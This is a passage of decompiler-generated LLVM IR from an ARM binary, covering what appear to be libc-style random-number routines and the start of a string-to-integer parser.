  %v2_11034 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_11034, i32* @r4, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i8 %v3_10f68, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 2, 0, 4, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_11020, { 1, 0 }
}

define i32 @function_11044(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11044:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11044 = load i32, i32* @r4, align 4
  store i32 %v3_11044, i32* %stack_var_-8, align 4
  %v1_11048 = add i32 %tmp, 12
  %v2_11048 = inttoptr i32 %v1_11048 to i8*
  %v3_11048 = load i8, i8* %v2_11048, align 1
  %v4_11048 = sext i8 %v3_11048 to i32
  store i32 %v4_11048, i32* %r3.global-to-local, align 4
  %v2_1104c = icmp eq i8 %v3_11048, 0
  store i32 %tmp, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v1_11058 = add i32 %tmp, 8
  %v2_11058 = inttoptr i32 %v1_11058 to i32*
  %v3_11058 = load i32, i32* %v2_11058, align 4
  store i32 %v3_11058, i32* %lr.global-to-local, align 4
  br i1 %v2_1104c, label %dec_label_pc_11060, label %dec_label_pc_11084

dec_label_pc_11060:                               ; preds = %dec_label_pc_11044
  %v1_11060 = inttoptr i32 %v3_11058 to i32*
  %v2_11060 = load i32, i32* %v1_11060, align 4
  store i32 %v2_11060, i32* %r2.global-to-local, align 4
  %v2_11068 = mul i32 %v2_11060, 1103515245
  %v1_11070 = add i32 %v2_11068, 12345
  %tmp6 = bitcast i32 %v1_11070 to float
  %tmp7 = call float @fabsf(float %tmp6)
  %v1_11074 = bitcast float %tmp7 to i32
  store i32 %v1_11074, i32* %r3.global-to-local, align 4
  store i32 %v1_11074, i32* %v1_11060, align 4
  %v0_1107c = load i32, i32* %r3.global-to-local, align 4
  %v2_1107c = inttoptr i32 %arg2 to i32*
  store i32 %v0_1107c, i32* %v2_1107c, align 4
  br label %dec_label_pc_110c4

dec_label_pc_11084:                               ; preds = %dec_label_pc_11044
  %v2_11084 = load i32, i32* %arg1, align 4
  store i32 %v2_11084, i32* %r2.global-to-local, align 4
  %v1_11088 = add i32 %tmp, 4
  %v2_11088 = inttoptr i32 %v1_11088 to i32*
  %v3_11088 = load i32, i32* %v2_11088, align 4
  store i32 %v3_11088, i32* %r0.global-to-local, align 4
  %v1_1108c = inttoptr i32 %v2_11084 to i32*
  %v2_1108c = load i32, i32* %v1_1108c, align 4
  store i32 %v2_1108c, i32* %r1.global-to-local, align 4
  %v1_11090 = inttoptr i32 %v3_11088 to i32*
  %v2_11090 = load i32, i32* %v1_11090, align 4
  %v4_11090 = add i32 %v3_11088, 4
  store i32 %v4_11090, i32* %r0.global-to-local, align 4
  %v2_11094 = add i32 %v2_11090, %v2_1108c
  store i32 %v2_11094, i32* %r3.global-to-local, align 4
  store i32 %v2_11094, i32* %v1_1108c, align 4
  %v3_11098 = load i32, i32* %r2.global-to-local, align 4
  %v4_11098 = add i32 %v3_11098, 4
  store i32 %v4_11098, i32* %r2.global-to-local, align 4
  %v0_1109c = load i32, i32* %ip.global-to-local, align 4
  %v1_1109c = add i32 %v0_1109c, 16
  %v2_1109c = inttoptr i32 %v1_1109c to i32*
  %v3_1109c = load i32, i32* %v2_1109c, align 4
  store i32 %v3_1109c, i32* %r1.global-to-local, align 4
  %v0_110a0 = load i32, i32* %r3.global-to-local, align 4
  %v3_110a0 = udiv i32 %v0_110a0, 2
  store i32 %v3_110a0, i32* %r3.global-to-local, align 4
  %v3_110a4 = icmp ult i32 %v4_11098, %v3_1109c
  %v1_110a8 = load i32, i32* %r4.global-to-local, align 4
  %v2_110a8 = inttoptr i32 %v1_110a8 to i32*
  store i32 %v3_110a0, i32* %v2_110a8, align 4
  br i1 %v3_110a4, label %dec_label_pc_110b4, label %._crit_edge

._crit_edge:                                      ; preds = %dec_label_pc_11084
  %v1_110ac = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_110ac, i32* %r2.global-to-local, align 4
  %v0_110bc.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_110b4:                               ; preds = %dec_label_pc_11084
  %v0_110b4 = load i32, i32* %r0.global-to-local, align 4
  %v1_110b4 = load i32, i32* %r1.global-to-local, align 4
  %v3_110b4 = icmp ult i32 %v0_110b4, %v1_110b4
  br i1 %v3_110b4, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_110b4
  %v1_110b8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_110b8, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_110b4, %._crit_edge, %bb
  %v0_110bc = phi i32 [ %v0_110bc.pre, %._crit_edge ], [ %v0_110b4, %dec_label_pc_110b4 ], [ %v1_110b8, %bb ]
  %v1_110bc = load i32, i32* %ip.global-to-local, align 4
  %v2_110bc = add i32 %v1_110bc, 4
  %v3_110bc = inttoptr i32 %v2_110bc to i32*
  store i32 %v0_110bc, i32* %v3_110bc, align 4
  %v0_110c0 = load i32, i32* %r2.global-to-local, align 4
  %v1_110c0 = load i32, i32* %ip.global-to-local, align 4
  %v2_110c0 = inttoptr i32 %v1_110c0 to i32*
  store i32 %v0_110c0, i32* %v2_110c0, align 4
  br label %dec_label_pc_110c4

dec_label_pc_110c4:                               ; preds = %dec_label_pc_11060, %bb5
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_110c8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_110c8, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_110a0, { 1, 0 }
  uselistorder i32 %v1_11074, { 1, 0 }
  uselistorder i32 %tmp, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 4, 3, 5, 6, 0 }
  uselistorder label %dec_label_pc_110c4, { 1, 0 }
  uselistorder label %bb5, { 2, 0, 1 }
}

define i32 @function_110d4(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_110d4:
  %fp.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_110d4 = load i32, i32* @r4, align 4
  store i32 %v3_110d4, i32* %stack_var_-36, align 4
  %v12_110d4 = load i32, i32* @r7, align 4
  %v1_110d8 = add i32 %tmp, 12
  %v2_110d8 = inttoptr i32 %v1_110d8 to i8*
  %v3_110d8 = load i8, i8* %v2_110d8, align 1
  store i32 %tmp, i32* %r5.global-to-local, align 4
  %v3_110e8 = load i8, i8* %v2_110d8, align 1
  %tmp24 = icmp ugt i8 %v3_110d8, 4
  br i1 %tmp24, label %.dec_label_pc_11194_crit_edge, label %dec_label_pc_110f4

.dec_label_pc_11194_crit_edge:                    ; preds = %dec_label_pc_110d4
  br label %dec_label_pc_11194

dec_label_pc_110f4:                               ; preds = %dec_label_pc_110d4
  %v0_110f4 = load i32, i32* @r0, align 4
  %v2_110f4 = icmp eq i32 %v0_110f4, 0
  %v1_110f8 = add i32 %tmp, 8
  %v2_110f8 = inttoptr i32 %v1_110f8 to i32*
  %v3_110f8 = load i32, i32* %v2_110f8, align 4
  store i32 %v3_110f8, i32* %r6.global-to-local, align 4
  br i1 %v2_110f4, label %bb, label %bb21

bb:                                               ; preds = %dec_label_pc_110f4
  store i32 1, i32* @r0, align 4
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_110f4, %bb
  %v0_11104 = phi i32 [ %v0_110f4, %dec_label_pc_110f4 ], [ 1, %bb ]
  %v2_11100 = icmp eq i8 %v3_110e8, 0
  %v2_11104 = inttoptr i32 %v3_110f8 to i32*
  store i32 %v0_11104, i32* %v2_11104, align 4
  br i1 %v2_11100, label %dec_label_pc_11190, label %dec_label_pc_1110c

dec_label_pc_1110c:                               ; preds = %bb21
  %v1_1110c = add i32 %tmp, 13
  %v2_1110c = inttoptr i32 %v1_1110c to i8*
  %v3_1110c = load i8, i8* %v2_1110c, align 1
  %v4_1110c = sext i8 %v3_1110c to i32
  store i32 %v4_1110c, i32* %sl.global-to-local, align 4
  store i32 16807, i32* %fp.global-to-local, align 4
  store i32 2836, i32* %sb.global-to-local, align 4
  %v0_11118 = load i32, i32* @r0, align 4
  store i32 %v0_11118, i32* @r4, align 4
  %v0_1111c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1111c, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1114c

dec_label_pc_11128:                               ; preds = %dec_label_pc_1114c
  %v2_11128 = call i32 @function_cba0(i32 %v0_11150, i32 127773)
  %v0_1112c = load i32, i32* @r4, align 4
  store i32 %v0_1112c, i32* @r0, align 4
  %v1_11130 = load i32, i32* %fp.global-to-local, align 4
  %v2_11130 = mul i32 %v1_11130, 127773
  store i32 %v2_11130, i32* @r4, align 4
  store i32 127773, i32* @r1, align 4
  %v0_11138 = call i32 @function_ca74()
  %v1_1113c = load i32, i32* %sb.global-to-local, align 4
  %v2_1113c = mul i32 %v1_1113c, %v0_11138
  %v0_11140 = load i32, i32* @r4, align 4
  %v2_11140 = sub i32 %v0_11140, %v2_1113c
  %v8_11140 = icmp slt i32 %v2_11140, 0
  br i1 %v8_11140, label %bb22, label %bb23

bb22:                                             ; preds = %dec_label_pc_11128
  %v2_11144 = add i32 %v2_11140, 2147483647
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_11128, %bb22
  %storemerge = phi i32 [ %v2_11144, %bb22 ], [ %v2_11140, %dec_label_pc_11128 ]
  %v0_11148 = phi i32 [ %v2_11144, %bb22 ], [ %v2_11140, %dec_label_pc_11128 ]
  store i32 %storemerge, i32* @r4, align 4
  %v1_11148 = load i32, i32* %r8.global-to-local, align 4
  %v2_11148 = add i32 %v1_11148, 4
  %v3_11148 = inttoptr i32 %v2_11148 to i32*
  store i32 %v0_11148, i32* %v3_11148, align 4
  %v4_11148 = load i32, i32* %r8.global-to-local, align 4
  %v5_11148 = add i32 %v4_11148, 4
  store i32 %v5_11148, i32* %r8.global-to-local, align 4
  %v0_1114c.pre = load i32, i32* @r7, align 4
  %v1_1114c.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_11150.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1114c

dec_label_pc_1114c:                               ; preds = %dec_label_pc_1110c, %bb23
  %v0_11150 = phi i32 [ %v0_11118, %dec_label_pc_1110c ], [ %v0_11150.pre, %bb23 ]
  %v0_11164 = phi i32 [ %v4_1110c, %dec_label_pc_1110c ], [ %v1_1114c.pre, %bb23 ]
  %v0_11158 = phi i32 [ 1, %dec_label_pc_1110c ], [ %v0_1114c.pre, %bb23 ]
  %v1_11158 = add i32 %v0_11158, 1
  store i32 %v1_11158, i32* @r7, align 4
  %v5_1115c = icmp slt i32 %v0_11158, %v0_11164
  br i1 %v5_1115c, label %dec_label_pc_11128, label %dec_label_pc_11160

dec_label_pc_11160:                               ; preds = %dec_label_pc_1114c
  %v2_11164 = mul i32 %v0_11164, 10
  store i32 %v2_11164, i32* @r4, align 4
  %v0_11168 = load i32, i32* %r5.global-to-local, align 4
  %v1_11168 = add i32 %v0_11168, 14
  %v2_11168 = inttoptr i32 %v1_11168 to i8*
  %v3_11168 = load i8, i8* %v2_11168, align 1
  %v4_11168 = sext i8 %v3_11168 to i32
  %v2_1116c = ptrtoint i32* %stack_var_-44 to i32
  %v0_11170 = load i32, i32* %r6.global-to-local, align 4
  %v4_11170 = mul nsw i32 %v4_11168, 4
  %v5_11170 = add i32 %v0_11170, %v4_11170
  %v1_11174 = inttoptr i32 %v0_11168 to i32*
  store i32 %v5_11170, i32* %v1_11174, align 4
  %v3_11174 = add i32 %v0_11168, 4
  %v4_11174 = inttoptr i32 %v3_11174 to i32*
  %v5_11174 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v5_11174, i32* %v4_11174, align 4
  br label %dec_label_pc_11180

dec_label_pc_1117c:                               ; preds = %dec_label_pc_11180
  %v0_11184 = load i32, i32* %r5.global-to-local, align 4
  %v2_1117c = inttoptr i32 %v0_11184 to i32*
  %v3_1117c = call i32 @function_11044(i32* %v2_1117c, i32 %v2_1116c)
  br label %dec_label_pc_11180

dec_label_pc_11180:                               ; preds = %dec_label_pc_11160, %dec_label_pc_1117c
  %v0_11180 = load i32, i32* @r4, align 4
  %v1_11180 = add i32 %v0_11180, -1
  store i32 %v1_11180, i32* @r4, align 4
  %v6_11180 = icmp slt i32 %v1_11180, 0
  br i1 %v6_11180, label %dec_label_pc_11190, label %dec_label_pc_1117c

dec_label_pc_11190:                               ; preds = %dec_label_pc_11180, %bb21
  %v2_11198.pre = load i32, i32* %stack_var_-36, align 4
  br label %dec_label_pc_11194

dec_label_pc_11194:                               ; preds = %.dec_label_pc_11194_crit_edge, %dec_label_pc_11190
  %v2_11198 = phi i32 [ %v3_110d4, %.dec_label_pc_11194_crit_edge ], [ %v2_11198.pre, %dec_label_pc_11190 ]
  %v1_1119c = phi i32 [ -1, %.dec_label_pc_11194_crit_edge ], [ 0, %dec_label_pc_11190 ]
  store i32 %v2_11198, i32* @r4, align 4
  store i32 %v12_110d4, i32* @r7, align 4
  ret i32 %v1_1119c

; uselistorder directives
  uselistorder i32 %v1_11180, { 1, 0 }
  uselistorder i32 %v0_11168, { 1, 0, 2 }
  uselistorder i32 %v0_11158, { 1, 0 }
  uselistorder i32 %tmp, { 2, 3, 0, 1 }
  uselistorder i32 127773, { 2, 1, 0 }
  uselistorder label %dec_label_pc_11194, { 1, 0 }
  uselistorder label %dec_label_pc_11180, { 1, 0 }
  uselistorder label %dec_label_pc_1114c, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @function_111a0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_111a0:
  %v0_111a0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_111a0, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_111a0
  %v2_111a0 = load i32, i32* @r7, align 4
  %v5_111a0 = udiv i32 %v2_111a0, 8
  %v6_111a0 = and i32 %v5_111a0, %arg1
  %v3_111a4 = load i32, i32* @fp, align 4
  %v8_111a4 = shl i32 %v6_111a0, %v3_111a4
  %v9_111a4 = and i32 %v8_111a4, %arg1
  %v2_111a8 = load i32, i32* @sp, align 4
  %v8_111a8 = shl i32 %v2_111a8, %arg3
  %v9_111a8 = and i32 %v8_111a8, %arg2
  call void @__pseudo_branch(i32 %v9_111a8)
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_111a0, %bb
  %v10_111a8 = phi i32 [ %arg1, %dec_label_pc_111a0 ], [ %v9_111a4, %bb ]
  ret i32 %v10_111a8

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_111ac(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_111ac:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v3_111ac = load i32, i32* @r4, align 4
  %v6_111ac = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r5, align 4
  %tmp28 = icmp ult i32 %arg2, 128
  br i1 %tmp28, label %dec_label_pc_111dc, label %dec_label_pc_111cc

dec_label_pc_111cc:                               ; preds = %dec_label_pc_111ac
  %v2_111cc = icmp ugt i32 %arg2, 254
  %v7_111cc = icmp eq i32 %arg2, 255
  %v2_111d0 = xor i1 %v7_111cc, true
  %v3_111d0 = and i1 %v2_111cc, %v2_111d0
  br i1 %v3_111d0, label %bb, label %bb21

bb:                                               ; preds = %dec_label_pc_111cc
  store i32 4, i32* @r4, align 4
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_111cc, %bb
  %v1_112087 = phi i32 [ %v3_111ac, %dec_label_pc_111cc ], [ 4, %bb ]
  %v2_111d4 = xor i1 %v2_111cc, true
  %v3_111d4 = or i1 %v7_111cc, %v2_111d4
  br i1 %v3_111d4, label %bb22, label %bb26

bb22:                                             ; preds = %bb21
  store i32 3, i32* @r4, align 4
  br label %bb26

dec_label_pc_111dc:                               ; preds = %dec_label_pc_111ac
  %tmp29 = icmp ugt i32 %arg2, 31
  br i1 %tmp29, label %dec_label_pc_111f4, label %dec_label_pc_111e4

dec_label_pc_111e4:                               ; preds = %dec_label_pc_111dc
  %tmp30 = icmp ugt i32 %arg2, 7
  br i1 %tmp30, label %.thread10, label %dec_label_pc_11264

.thread10:                                        ; preds = %dec_label_pc_111e4
  store i32 0, i32* @r4, align 4
  br label %bb26

dec_label_pc_111f4:                               ; preds = %dec_label_pc_111dc
  %v2_111f4 = icmp ugt i32 %arg2, 62
  %v7_111f4 = icmp eq i32 %arg2, 63
  %v2_111f8 = xor i1 %v7_111f4, true
  %v3_111f8 = and i1 %v2_111f4, %v2_111f8
  br i1 %v3_111f8, label %bb23, label %bb24

bb23:                                             ; preds = %dec_label_pc_111f4
  store i32 2, i32* @r4, align 4
  br label %bb24

bb24:                                             ; preds = %dec_label_pc_111f4, %bb23
  %v1_112086 = phi i32 [ %v3_111ac, %dec_label_pc_111f4 ], [ 2, %bb23 ]
  %v2_111fc = xor i1 %v2_111f4, true
  %v3_111fc = or i1 %v7_111f4, %v2_111fc
  br i1 %v3_111fc, label %bb25, label %bb26

bb25:                                             ; preds = %bb24
  store i32 1, i32* @r4, align 4
  br label %bb26

bb26:                                             ; preds = %.thread10, %bb22, %bb21, %bb24, %bb25
  %v1_11214 = phi i32 [ 3, %bb22 ], [ %v1_112087, %bb21 ], [ %v1_112086, %bb24 ], [ 1, %bb25 ], [ 0, %.thread10 ]
  store i32 ptrtoint (i32* @global_var_1a328.464 to i32), i32* %r3.global-to-local, align 4
  %v4_11208 = mul i32 %v1_11214, 4
  %v5_11208 = add i32 %v4_11208, ptrtoint (i32* @global_var_1a328.464 to i32)
  store i32 %v5_11208, i32* %r2.global-to-local, align 4
  %v1_1120c = add i32 %v4_11208, add (i32 ptrtoint (i32* @global_var_1a328.464 to i32), i32 20)
  %v2_1120c = inttoptr i32 %v1_1120c to i32*
  %v3_1120c = load i32, i32* %v2_1120c, align 4
  store i32 %v3_1120c, i32* %r1.global-to-local, align 4
  %v1_11210 = add i32 %tmp, 4
  store i32 %v1_11210, i32* @r6, align 4
  %v6_11214 = inttoptr i32 %v5_11208 to i32*
  %v7_11214 = load i32, i32* %v6_11214, align 4
  store i32 %v7_11214, i32* %r2.global-to-local, align 4
  %v4_11218 = mul i32 %v3_1120c, 4
  %v5_11218 = add i32 %v4_11218, %v1_11210
  store i32 %v5_11218, i32* %r3.global-to-local, align 4
  %v2_1121c = add i32 %arg3, 16
  %v3_1121c = inttoptr i32 %v2_1121c to i32*
  store i32 %v5_11218, i32* %v3_1121c, align 4
  %v0_11220 = load i32, i32* %r2.global-to-local, align 4
  %v1_11220 = trunc i32 %v0_11220 to i8
  %v2_11220 = load i32, i32* @r5, align 4
  %v3_11220 = add i32 %v2_11220, 14
  %v4_11220 = inttoptr i32 %v3_11220 to i8*
  store i8 %v1_11220, i8* %v4_11220, align 1
  %v0_11224 = load i32, i32* %r1.global-to-local, align 4
  %v1_11224 = trunc i32 %v0_11224 to i8
  %v2_11224 = load i32, i32* @r5, align 4
  %v3_11224 = add i32 %v2_11224, 13
  %v4_11224 = inttoptr i32 %v3_11224 to i8*
  store i8 %v1_11224, i8* %v4_11224, align 1
  %v0_11228 = load i32, i32* @r4, align 4
  %v1_11228 = trunc i32 %v0_11228 to i8
  %v2_11228 = load i32, i32* @r5, align 4
  %v3_11228 = add i32 %v2_11228, 12
  %v4_11228 = inttoptr i32 %v3_11228 to i8*
  store i8 %v1_11228, i8* %v4_11228, align 1
  %v0_1122c = load i32, i32* @r6, align 4
  %v1_1122c = load i32, i32* @r5, align 4
  %v2_1122c = add i32 %v1_1122c, 8
  %v3_1122c = inttoptr i32 %v2_1122c to i32*
  store i32 %v0_1122c, i32* %v3_1122c, align 4
  %v0_11230 = load i32, i32* @r5, align 4
  store i32 %v0_11230, i32* %r1.global-to-local, align 4
  %v0_11234 = load i32, i32* @r0, align 4
  %v2_11234 = inttoptr i32 %v0_11234 to i32*
  %v3_11234 = call i32 @function_110d4(i32* %v2_11234, i32 %v0_11230)
  store i32 %v3_11234, i32* %r0.global-to-local, align 4
  %v0_11238 = load i32, i32* @r4, align 4
  %v2_11238 = icmp eq i32 %v0_11238, 0
  br i1 %v2_11238, label %bb27, label %.thread4

bb27:                                             ; preds = %bb26
  %v1_1125412 = load i32, i32* @r7, align 4
  %v2_1125413 = inttoptr i32 %v1_1125412 to i32*
  store i32 0, i32* %v2_1125413, align 4
  %v1_11258 = load i32, i32* @r4, align 4
  store i32 %v1_11258, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1127c

.thread4:                                         ; preds = %bb26
  %v1_1123c = load i32, i32* @r5, align 4
  %v2_1123c = add i32 %v1_1123c, 4
  %v3_1123c = inttoptr i32 %v2_1123c to i32*
  %v4_1123c = load i32, i32* %v3_1123c, align 4
  %v1_11240 = load i32, i32* @r6, align 4
  %v3_11240 = sub i32 %v4_1123c, %v1_11240
  %v4_11244 = sdiv i32 %v3_11240, 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_1124c = mul i32 %v4_11244, 5
  %v5_1124c = add i32 %v4_1124c, %v0_11238
  store i32 %v5_1124c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_11254 = load i32, i32* @r7, align 4
  %v2_11254 = inttoptr i32 %v1_11254 to i32*
  store i32 0, i32* %v2_11254, align 4
  %v1_1125c = load i32, i32* %r3.global-to-local, align 4
  %v2_1125c = load i32, i32* @r7, align 4
  %v3_1125c = inttoptr i32 %v2_1125c to i32*
  store i32 %v1_1125c, i32* %v3_1125c, align 4
  %v1_11284.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1127c

dec_label_pc_11264:                               ; preds = %dec_label_pc_111e4
  %v0_11264 = call i32 @function_ce08()
  store i32 %v0_11264, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r4.global-to-local, align 4
  %v2_1126c = inttoptr i32 %v0_11264 to i32*
  store i32 22, i32* %v2_1126c, align 4
  %v0_11270 = call i32 @function_ce08()
  %v0_11274 = load i32, i32* %r4.global-to-local, align 4
  %v2_11274 = inttoptr i32 %v0_11270 to i32*
  store i32 %v0_11274, i32* %v2_11274, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1127c

dec_label_pc_1127c:                               ; preds = %bb27, %.thread4, %dec_label_pc_11264
  %v1_11284 = phi i32 [ %v1_11284.pre, %.thread4 ], [ %v1_11258, %bb27 ], [ -1, %dec_label_pc_11264 ]
  store i32 %v3_111ac, i32* @r4, align 4
  store i32 %v6_111ac, i32* @r5, align 4
  ret i32 %v1_11284

; uselistorder directives
  uselistorder i1 %v7_111f4, { 1, 0 }
  uselistorder i1 %v7_111cc, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 2, 3, 1, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_1a328.464 to i32), { 1, 0, 2 }
  uselistorder i32 %arg2, { 5, 6, 0, 1, 4, 3, 2, 7 }
  uselistorder label %dec_label_pc_1127c, { 2, 1, 0 }
  uselistorder label %bb26, { 4, 3, 0, 1, 2 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @function_11290(i32 %arg1) local_unnamed_addr {
dec_label_pc_11290:
  store i32 0, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_112a0 = call i32 @function_112b0()
  ret i32 %v0_112a0
}

define i32 @function_112b0() local_unnamed_addr {
dec_label_pc_112b0:
  store i32 1, i32* @r3, align 4
  %v0_112bc = call i32 @function_112cc()
  ret i32 %v0_112bc
}

define i32 @function_112cc() local_unnamed_addr {
dec_label_pc_112cc:
  %fp.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %v3_112cc = load i32, i32* @r4, align 4
  %v12_112cc = load i32, i32* @r7, align 4
  store i32 920, i32* @lr, align 4
  %v0_112e0 = load i32, i32* @r1, align 4
  store i32 %v0_112e0, i32* %fp.global-to-local, align 4
  %v0_112e4 = load i32, i32* @r2, align 4
  store i32 %v0_112e4, i32* %r5.global-to-local, align 4
  %v0_112e8 = load i32, i32* @r0, align 4
  store i32 %v0_112e8, i32* @r4, align 4
  %v0_112ec = load i32, i32* @r3, align 4
  br label %dec_label_pc_112f8

dec_label_pc_112f4:                               ; preds = %dec_label_pc_112f8
  %v1_112f4 = add i32 %v0_11330, 1
  store i32 %v1_112f4, i32* @r4, align 4
  br label %dec_label_pc_112f8

dec_label_pc_112f8:                               ; preds = %dec_label_pc_112cc, %dec_label_pc_112f4
  %v0_11330 = phi i32 [ %v0_112e8, %dec_label_pc_112cc ], [ %v1_112f4, %dec_label_pc_112f4 ]
  %v1_112f8 = inttoptr i32 %v0_11330 to i8*
  %v2_112f8 = load i8, i8* %v1_112f8, align 1
  %v3_112f8 = zext i8 %v2_112f8 to i32
  %v4_112fc = load i32, i32* inttoptr (i32 142964 to i32*), align 4
  %v2_11300 = mul nuw nsw i32 %v3_112f8, 2
  %v2_11304 = add i32 %v2_11300, %v4_112fc
  %v3_11304 = inttoptr i32 %v2_11304 to i16*
  %v4_11304 = load i16, i16* %v3_11304, align 2
  %v1_11308 = and i16 %v4_11304, 32
  %v2_11308 = icmp eq i16 %v1_11308, 0
  br i1 %v2_11308, label %dec_label_pc_11310, label %dec_label_pc_112f4

dec_label_pc_11310:                               ; preds = %dec_label_pc_112f8
  %v7_11310 = icmp eq i8 %v2_112f8, 43
  br i1 %v7_11310, label %dec_label_pc_11330, label %dec_label_pc_11318

dec_label_pc_11318:                               ; preds = %dec_label_pc_11310
  %v7_11318 = icmp eq i8 %v2_112f8, 45
  br i1 %v7_11318, label %dec_label_pc_11330, label %bb

bb:                                               ; preds = %dec_label_pc_11318
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_11334

dec_label_pc_11330:                               ; preds = %dec_label_pc_11310, %dec_label_pc_11318
  %storemerge39 = phi i32 [ 1, %dec_label_pc_11318 ], [ 0, %dec_label_pc_11310 ]
  store i32 %storemerge39, i32* @r7, align 4
  %v1_11330 = add i32 %v0_11330, 1
  store i32 %v1_11330, i32* @r4, align 4
  br label %dec_label_pc_11334

dec_label_pc_11334:                               ; preds = %bb, %dec_label_pc_11330
  %v0_11354 = phi i32 [ %v0_11330, %bb ], [ %v1_11330, %dec_label_pc_11330 ]
  %v1_11334 = and i32 %v0_112e4, -17
  %v3_11334 = icmp eq i32 %v1_11334, 0
  br i1 %v3_11334, label %dec_label_pc_11340, label %bb52

bb52:                                             ; preds = %dec_label_pc_11334
  store i32 %v0_112e8, i32* %r6.global-to-local, align 4
  br label %bb56

dec_label_pc_11340:                               ; preds = %dec_label_pc_11334
  %v1_11340 = inttoptr i32 %v0_11354 to i8*
  %v2_11340 = load i8, i8* %v1_11340, align 1
  %v7_11344 = icmp eq i8 %v2_11340, 48
  %v1_11348 = add i32 %v0_112e4, 10
  store i32 %v1_11348, i32* %r5.global-to-local, align 4
  br i1 %v7_11344, label %dec_label_pc_11354, label %bb53

bb53:                                             ; preds = %dec_label_pc_11340
  store i32 %v0_112e8, i32* %r6.global-to-local, align 4
  br label %.thread8

dec_label_pc_11354:                               ; preds = %dec_label_pc_11340
  %v1_11354 = add i32 %v0_11354, 1
  %v2_11354 = inttoptr i32 %v1_11354 to i8*
  %v3_11354 = load i8, i8* %v2_11354, align 1
  %v4_11354 = zext i8 %v3_11354 to i32
  store i32 %v1_11354, i32* @r4, align 4
  %v1_11358 = or i32 %v4_11354, 32
  %v7_1135c = icmp eq i32 %v1_11358, 120
  %v1_11360 = add i32 %v0_112e4, 8
  store i32 %v1_11360, i32* %r5.global-to-local, align 4
